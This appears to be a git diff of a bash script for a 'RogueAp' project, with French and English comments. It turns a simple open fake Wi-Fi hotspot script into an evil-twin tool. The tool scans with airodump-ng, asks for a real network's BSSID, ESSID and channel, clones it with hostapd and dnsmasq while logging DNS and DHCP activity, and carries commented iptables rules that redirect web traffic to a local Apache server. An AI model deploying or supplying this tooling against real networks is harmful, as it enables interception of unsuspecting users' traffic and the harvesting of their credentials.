@@ -1,64 +1,93 @@
 #!/bin/bash
 
-#Projet RogueAp
+#WARNING !!! Don't forget to active you wifi card on you VM !!
+#airmon-ng stop wlan0mon &>> /dev/null
+#-----------Variables----------------------#
+INTERFACE=$(ifconfig |grep wl |cut -d ":" -f1)
 
-#Create a fake access point first !
-
-#Interface réseau :
-NET_IFACE=eth0
-ROGUE_IFACE=wlan0
-
+#-----------Log Files----------------------#
+touch /tmp/log.txt
 LOG_FILE=/tmp/log.txt
+touch /tmp/LOG_HOSTAPD.txt
+LOG_HOSTAPD=/tmp/LOG_HOSTAPD.TXT
+touch /tmp/LOG_DNS.txt
+LOG_DNS=/tmp/LOG_DNS.txt
 
-# Nettoyage des processus et des fichiers
-# Les redirections &> sont là pour ne rien afficher à  l'écran
+#-----------Service to install-------------#
+apt update -y &>> /dev/null
+apt install hostpad dnsmasq apache2 -y  &>> /dev/null
 
-rm /tmp/udhcpd.* &> /dev/null
-rm $LOG_FILE &> /dev/null
-killall airbase-ng &> /dev/null
-killall udhcpd &> /dev/null
-airmon-ng stop wlan0mon &> /dev/null
+#-----------Interface in monitor mode------#
+echo "My wifi interface are -->"$INTERFACE
+airmon-ng start $INTERFACE &>> $LOG_FILE
+airmon-ng check kill &>> /dev/null
 
-# Installation de udhcpd et génération de sa config
-echo "Installation de Udhcpd"
-echo "(Ca peut prendre un peu de temps...)"
-# Pour utiliser le script sous Kali 1.0, décommenter la ligne suivante
-#apt-get update &>> $LOG_FILE
-apt-get install udhcpd &>> $LOG_FILE
-echo "max_leases 10
-start 192.168.2.10
-end 192.168.2.20
-interface at0
-domain local
-option dns 8.8.8.8
-option subnet 255.255.255.0
-option router 192.168.2.1
-lease 7200
-lease_file /tmp/udhcpd.leases" > /tmp/udhcpd.conf
-touch /tmp/udhcpd.leases &>> $LOG_FILE
+MONITOR=$(ifconfig |grep mon |cut -d ":" -f1)
 
-#Création du réseau WiFi
-echo "Démarage du réseau WiFi"
-airmon-ng start $ROGUE_IFACE &>> $LOG_FILE
-airbase-ng -c 11 -e 'WiFi Gratuit' wlan0mon &>> $LOG_FILE &
-sleep 5
-ifconfig at0 up
-ifconfig at0 192.168.2.1 netmask 255.255.255.0 &>> $LOG_FILE
-# Démarrage du DHCP et du Transfert de trafic
-echo "Démarrage du serveur DHCP"
-udhcpd /tmp/udhcpd.conf &>> $LOG_FILE
-echo 1 > /proc/sys/net/ipv4/ip_forward
+echo "Wifi card is now on monitor mode -->"$MONITOR
+sleep 2;
+#-----------Spoof---------------------------#
+airodump-ng $MONITOR
 
+echo "Choose the BSSID of the network to copy :"
+read BSSID
+echo "Enter the ESSID of the network :"
+read ESSID
+echo "Also the channel :"
+read CHANNEL
 
-#Regles Iptables :
+echo "Your choose the network :"$ESSID","$BSSID","$CHANNEL "nice choice"
 
-# Effacer toutes les règles IpTables pour ne garder que les bonnes
-iptables -F
-iptables -X
-iptables -t nat -F
-iptables -t nat -X
+#-----------Hostapd Configuration-----------#
+mkdir /root/fakeap/
 
-# Activer le transfert vers l'interface $NET_IFACE
-iptables -t nat -A POSTROUTING -o $NET_IFACE -j MASQUERADE
-echo "Le réseau est opérationnel !"
+touch hostapd.conf
+echo "
+interface=$MONITOR
+driver=nl80211
+ssid=$ESSID
+hw_mode=g
+channel=$CHANNEL
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+" > /root/fakeap/hostapd.conf
+#--------------------------------------------#
+#-----------Dnsmasq Configuration------------#
+touch dnsmasq.conf
+echo "
+interface=$MONITOR
+dhcp-range=10.0.0.10,10.0.0.50,255.255.255.0,24h
+dhcp-option=3,10.0.0.1
+dhcp-option=6,10.0.0.1
+server=8.8.8.8
+log-queries
+log-dhcp
+listen-address=127.0.0.1
+" > /root/fakeap/dnsmasq.conf
+#---------------------------------------------#
+ifconfig wlan0mon up 10.0.0.1 netmask 255.255.255.0
+#route add -net 10.0.0.1 netmask 255.255.255.0 gw 10.0.0.1 
+killall network-manager dnsmasq wpa_supplicant dhcpd &>> /dev/null #Kill process
 
+echo "Now we have can start the access point"
+
+#--------Access Point ------------------------#
+echo "Access Point Starting..."
+hostapd /root/fakeap/hostapd.conf &>> $LOG_HOSTAPD
+
+echo "DHCP and DNS Server started tho"
+dnsmasq -C /root/fakeap/dnsmasq.conf -d &>> $LOG_DNS
+
+#------------------------------------------------------------------------------------------------------#
+
+#Ces 4 directives permettent de supprimer les régles existantes
+#iptables --flush && iptables --table nat --flush && iptables --delete-chain && iptables --table nat --delete-chain
+
+#iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+#iptables --append FORWARD --in-interface wlan0mon -j ACCEPT
+
+#iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80 #Permet de redirige le trafic vers l'@ ip du router
+
+#----On active la redirection de trafic-----#
+#echo 1 > /proc/sys/net/ipv4/ip_forward
